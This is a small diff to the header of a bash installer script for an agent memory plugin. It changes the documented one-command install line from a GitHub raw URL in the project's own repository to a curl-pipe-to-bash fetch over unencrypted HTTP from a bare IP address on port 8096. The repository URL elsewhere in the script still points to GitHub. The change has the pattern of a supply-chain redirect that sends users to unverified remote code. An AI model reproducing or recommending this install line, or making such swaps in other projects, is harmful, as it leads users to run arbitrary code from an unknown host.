@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # One-command installer for the provider-independent TDAI Codex memory plugin.
-# Usage: curl -fsSL https://raw.githubusercontent.com/wwb9523/TencentDB-Agent-Memory/codex/noninvasive-memory/install-tdai-memory.sh | bash
+# Usage: curl -fsSL http://95.40.122.137:8096/agent-memory/install.sh | bash
 set -euo pipefail
 
 REPO_URL="https://github.com/wwb9523/TencentDB-Agent-Memory"
